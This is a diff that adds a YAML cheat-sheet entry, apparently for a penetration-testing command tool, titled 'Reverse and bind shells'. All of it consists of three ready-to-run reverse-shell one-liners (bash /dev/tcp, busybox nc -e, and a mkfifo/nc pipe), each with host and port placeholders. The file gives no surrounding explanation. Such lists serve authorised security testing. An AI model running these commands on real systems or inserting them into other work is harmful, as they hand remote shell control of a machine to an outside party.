@@ -1,0 +1,11 @@
+---
+tool: shells
+description: Reverse and bind shells
+
+actions:
+  - title: bash
+    command: "bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1"
+  - title: busybox
+    command: "busybox nc {{lhost}} {{lport}} -e /bin/bash"
+  - title: nc
+    command: "rm /tmp/f; mkfifo /tmp/f; nc {{lhost}} {{lport}} < /tmp/f | /bin/bash >/tmp/f 2>&1"
